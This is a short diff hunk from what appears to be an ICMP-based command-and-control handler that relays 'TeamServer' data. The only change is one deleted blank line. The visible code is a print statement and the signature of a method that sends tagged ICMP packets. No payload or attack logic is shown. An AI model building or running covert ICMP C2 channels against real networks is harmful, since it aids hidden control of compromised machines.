@@ -112,7 +112,6 @@ class ICMP_C2_Handler:
         print(f"[+] Replied to {ip_src} with TeamServer’s data")
 
 
-
     # for large frames/payloads
     def send_icmp_packet(self, ip_dst, icmp_id, icmp_seq, payload, tag=b"RQ47"):
         """
